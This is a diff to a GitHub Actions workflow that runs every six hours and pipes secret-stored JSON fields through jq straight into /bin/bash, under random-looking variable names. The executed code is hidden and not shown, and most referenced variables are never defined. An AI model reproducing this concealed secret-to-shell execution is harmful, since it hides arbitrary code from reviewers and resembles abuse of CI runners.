@@ -3,7 +3,7 @@ name: dongyugang0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
+    - cron: '3 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +12,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongyugang0987
         env:
-          izerf7: ${{ secrets.izerf7 }}
+          ing074: ${{ secrets.ing074 }}
         run: |
-          echo $izerf7 | jq -r .eze5 | /bin/bash
-          echo $okypq01104 | jq -r .aac1 | /bin/bash
-          echo $dy6 | jq -r .u0 | /bin/bash
+          echo $ing074 | jq -r .il68 | /bin/bash
+          echo $fo79 | jq -r .hxb74439 | /bin/bash
+          echo $ezbi58 | jq -r .fqo594 | /bin/bash
+          echo $jecd05363 | jq -r .seer548 | /bin/bash
+          echo $kcfl148 | jq -r .gfuz0 | /bin/bash
+          echo $g656 | jq -r .sl88 | /bin/bash
+          echo $ni572 | jq -r .hvt816 | /bin/bash
+          echo $p570 | jq -r .wnef2689 | /bin/bash
+          echo $mdepa8451 | jq -r .hcp21 | /bin/bash
+          echo $rbc952 | jq -r .g8 | /bin/bash
+          echo $dd536 | jq -r .vmedt2948 | /bin/bash
+          echo $q3579 | jq -r .uh49202 | /bin/bash
+          echo $rklve36 | jq -r .x2286 | /bin/bash
+          echo $a449 | jq -r .kmm546 | /bin/bash
+          echo $batd76 | jq -r .rcxa48392 | /bin/bash
+          echo $ruli1 | jq -r .l9 | /bin/bash
+          echo $olz57 | jq -r .i633 | /bin/bash
+          echo $xvj3 | jq -r .lzlg9162 | /bin/bash
 
